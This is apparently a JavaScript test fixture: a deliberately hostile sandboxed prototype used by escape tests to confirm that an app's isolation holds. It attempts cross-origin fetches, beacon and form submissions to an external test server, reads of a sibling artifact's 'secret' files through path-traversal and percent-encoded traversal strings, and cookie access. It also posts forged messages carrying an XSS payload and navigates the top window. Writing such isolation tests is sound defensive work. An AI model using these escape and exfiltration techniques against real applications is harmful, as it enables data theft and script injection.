// A hostile prototype (the escape tests, server/studio/escape.test.ts). It tries to reach the app's API, the
// network and a sibling artifact, to read and set cookies, to submit a form, to navigate the app's window and to
// send the app messages that are not pins. It records what it saw in window.__attempts; the tests check the effects
// themselves (what each server and the browser received), not only this record.
(async function () {
  var q = new URLSearchParams(location.search);
  var app = q.get("app");
  var ext = q.get("ext");
  var sibling = q.get("sibling");
  var attempts = (window.__attempts = {});

  function outcome(name, promise) {
    return promise.then(
      function (v) { attempts[name] = "succeeded: " + v; },
      function (e) { attempts[name] = "blocked: " + e.name; },
    );
  }
  function now(name, fn) {
    try {
      attempts[name] = "succeeded: " + fn();
    } catch (e) {
      attempts[name] = "blocked: " + e.name;
    }
  }
  function element(name, tag, url) {
    return new Promise(function (resolve) {
      var el = document.createElement(tag);
      el.onload = function () { attempts[name] = "loaded"; resolve(); };
      el.onerror = function () { attempts[name] = "blocked: error"; resolve(); };
      setTimeout(function () { if (!(name in attempts)) attempts[name] = "no answer"; resolve(); }, 1500);
      el.src = url;
      document.body.appendChild(el);
    });
  }
  var status = function (r) { return "status " + r.status + " " + r.type; };

  await Promise.all([
    // The app's API.
    outcome("fetchAppApi", fetch(app + "/api/state").then(status)),
    outcome("fetchAppApiNoCors", fetch(app + "/api/state", { mode: "no-cors" }).then(status)),
    element("imageAppApi", "img", app + "/api/state?as=image"),
    element("scriptAppApi", "script", app + "/api/state?as=script"),
    element("frameApp", "iframe", app + "/"),
    // The network: another local server, and the internet.
    outcome("fetchExternal", fetch(ext + "/fetch").then(status)),
    outcome("fetchInternet", fetch("https://example.com/orchestrator-escape").then(status)),
    element("imageExternal", "img", ext + "/image"),
    new Promise(function (resolve) {
      now("websocket", function () {
        var ws = new WebSocket(ext.replace("http", "ws") + "/socket");
        ws.onopen = function () { attempts.websocketOpened = true; };
        return "constructed";
      });
      setTimeout(resolve, 500);
    }),
    // A sibling artifact's files, on its own origin, and through a path on this one.
    outcome("fetchSibling", fetch(sibling + "/a/secret.txt").then(function (r) { return r.text(); })),
    element("scriptSibling", "script", sibling + "/a/secret.js"),
    element("imageSibling", "img", sibling + "/a/secret.png"),
    element("frameSibling", "iframe", sibling + "/a/index.html"),
    element("scriptSiblingByPath", "script", "/a/../../../sa-2/v1/a/secret.js"),
    element("scriptSiblingByEncodedPath", "script", "/a/%2e%2e/%2e%2e/%2e%2e/sa-2/v1/a/secret.js"),
  ]);
  now("beacon", function () { return navigator.sendBeacon(ext + "/beacon", "from-the-prototype"); });

  // Cookies and storage.
  now("readCookie", function () { return JSON.stringify(document.cookie); });
  now("setCookie", function () { document.cookie = "escaped=1; path=/"; return "set"; });
  now("localStorage", function () { return typeof window.localStorage.length; });

  // A form, into a frame of its own so this page keeps running.
  now("submitForm", function () {
    var form = document.getElementById("leak");
    form.action = ext + "/form";
    form.submit();
    return "submitted";
  });

  // Messages to the app that are not pins.
  now("postMessages", function () {
    var messages = [
      "orchestrator-pin",
      { type: "pin", x: 0.5, y: 0.5, selector: "main" },
      { type: "orchestrator-pin", x: 0.5, y: 0.5, selector: "main", html: "<img src=x onerror=alert(1)>" },
      { type: "orchestrator-pin", x: 7, y: 0.5, selector: "main" },
      { type: "orchestrator-pin", x: 0.5, y: 0.5, selector: "a".repeat(400) },
      { type: "orchestrator-command", name: "startFactory", args: {} },
    ];
    messages.forEach(function (m) { parent.postMessage(m, "*"); top.postMessage(m, "*"); });
    return messages.length;
  });

  now("openWindow", function () { return String(window.open(ext + "/popup")); });
  await new Promise(function (resolve) { setTimeout(resolve, 500); });
  window.__done = true;

  // Last, a second later (so the tests can read this page first), as it would replace the app's page: navigate the
  // app's window.
  setTimeout(function () {
    now("navigateTop", function () { top.location.href = ext + "/top"; return "navigated"; });
  }, 1000);
})();
